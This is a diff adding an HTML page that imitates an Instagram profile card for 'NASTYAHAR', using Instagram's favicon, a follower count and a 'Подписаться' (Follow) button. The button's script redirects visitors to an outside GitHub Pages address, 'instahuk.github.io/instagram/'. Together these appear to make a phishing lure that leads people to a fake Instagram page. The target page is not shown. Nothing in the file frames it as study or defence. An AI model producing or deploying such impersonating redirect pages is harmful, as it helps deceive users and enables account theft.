@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NASTYAHAR</title>
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+  <style>
+    *{
+      margin:0px;
+      padding:0px;
+      background: rgb(248, 248, 248);
+    }
+    img{
+      width:160px;
+      display: block;
+      margin: auto;
+      text-align: center;
+      margin-top:20px;
+      border-radius: 50%;
+    }
+    .box{
+     display: block;
+     margin: auto;
+     text-align: center;
+     margin-top:140px;
+     border:2px solid rgb(202, 202, 202);
+     width:350px;
+     height:400px;
+     border-radius:3px;
+     background: white;
+     
+    }
+    .folow{
+      display: block;
+      text-align: center;
+      margin: auto;
+      font-family: monospace;
+      margin-top:20px;
+      background: white;
+    }
+     .username{
+      display: block;
+      text-align: center;
+      margin: auto;
+      margin-top:20px;
+      font-family: monospace;
+      background: white;
+     }
+    button{
+       width:250px;
+       display: block;
+       margin: auto;
+       text-align: center;
+       height:35px;
+       margin-top: 30px;
+       border:0px;
+       border-radius:3px;
+       color: white;
+       background: rgb(62, 123, 255);
+     }
+  </style>
+</head>
+<body>
+     <div class="box">
+       <h1 class="folow">98🙍‍♂️</h1>
+         <img src="user.jpg" alt="">
+         <h1 class="username">NASTYAHAR</h1>
+         <button onclick='onl()'>Подписаться</button>
+     </div>
+</body>
+<script>
+  function onl(){
+    window.location="https://instahuk.github.io/instagram/";
+  }
+</script>
+</html>
